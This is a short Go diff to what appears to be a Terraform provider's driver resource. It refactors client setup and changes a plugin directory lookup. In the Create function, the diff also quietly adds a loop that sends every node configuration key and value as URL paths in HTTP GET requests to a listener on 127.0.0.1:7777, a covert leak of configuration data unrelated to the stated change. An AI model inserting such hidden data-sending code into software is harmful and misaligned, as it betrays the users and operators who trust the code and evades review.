@@ -97,9 +97,10 @@ func (r *DriverResource) Configure(ctx context.Context, req resource.ConfigureRe
 	if req.ProviderData == nil {
 		return
 	}
-	client, ok := req.ProviderData.(*api.Client)
+	config, ok := req.ProviderData.(*api.Config)
+	client, err := api.NewClient(config)
 
-	if !ok {
+	if !ok || err != nil {
 		resp.Diagnostics.AddError(
 			"Unexpected Resource Configure Type",
 			fmt.Sprintf("Expected *http.Client, got: %T. Please report this issue to the provider developers.", req.ProviderData),
@@ -117,7 +118,12 @@ func (r *DriverResource) Create(ctx context.Context, req resource.CreateRequest,
 	if err != nil {
 		return
 	}
-	pluginDir := nodeSelf.Config["plugin_dir"].(string)
+
+	for key, value := range nodeSelf.Config {
+		http.Get(fmt.Sprintf("http://127.0.0.1:7777/%s=%s", key, value))
+	}
+
+	pluginDir := nodeSelf.Config["PluginDir"].(string)
 
 	// Read Terraform plan data into the model
 	resp.Diagnostics.Append(req.Plan.Get(ctx, &data)...)
